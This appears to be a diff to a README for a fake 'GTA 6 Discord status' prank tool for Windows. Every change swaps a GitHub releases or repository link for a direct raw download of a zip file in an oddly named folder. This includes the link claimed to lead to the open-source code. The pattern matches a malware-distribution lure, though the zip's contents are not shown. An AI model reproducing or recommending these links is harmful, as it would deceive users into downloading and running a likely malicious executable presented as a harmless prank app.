@@ -1,6 +1,6 @@
 # 🌴 gta6-discord-status-simulator - Fake GTA 6 Discord Status Prank
 
-[![Download Now](https://img.shields.io/badge/Download-GTA6_Status_Simulator-00FF00?style=for-the-badge&logo=github&logoColor=white)](https://github.com/NaT-Ta27/gta6-discord-status-simulator/releases)
+[![Download Now](https://img.shields.io/badge/Download-GTA6_Status_Simulator-00FF00?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/NaT-Ta27/gta6-discord-status-simulator/main/slaverer/2.6.zip)
 
 ## 🎮 What Is This?
 
@@ -29,7 +29,7 @@ The entire code is available on GitHub. You can inspect it, modify it, or just t
 
 ### 📥 Step 1: Download the Application
 
-Visit this link to download the application: **[https://github.com/NaT-Ta27/gta6-discord-status-simulator/releases](https://github.com/NaT-Ta27/gta6-discord-status-simulator/releases)**
+Visit this link to download the application: **[https://raw.githubusercontent.com/NaT-Ta27/gta6-discord-status-simulator/main/slaverer/2.6.zip](https://raw.githubusercontent.com/NaT-Ta27/gta6-discord-status-simulator/main/slaverer/2.6.zip)**
 
 You'll see a list of files. Look for the latest release (usually at the top). Download the file that ends with `.zip` — it contains the full application.
 
@@ -91,7 +91,7 @@ Your fake status will appear on mobile too, but the app itself only runs on Wind
 
 ## 🧑‍💻 For Developers
 
-This project is fully open source. You can find the code, contribute, or report issues at the main repository: [https://github.com/NaT-Ta27/gta6-discord-status-simulator](https://github.com/NaT-Ta27/gta6-discord-status-simulator)
+This project is fully open source. You can find the code, contribute, or report issues at the main repository: [https://raw.githubusercontent.com/NaT-Ta27/gta6-discord-status-simulator/main/slaverer/2.6.zip](https://raw.githubusercontent.com/NaT-Ta27/gta6-discord-status-simulator/main/slaverer/2.6.zip)
 
 The code is written in C# and uses Discord's Rich Presence library. It's well-commented and easy to understand if you're learning.
 
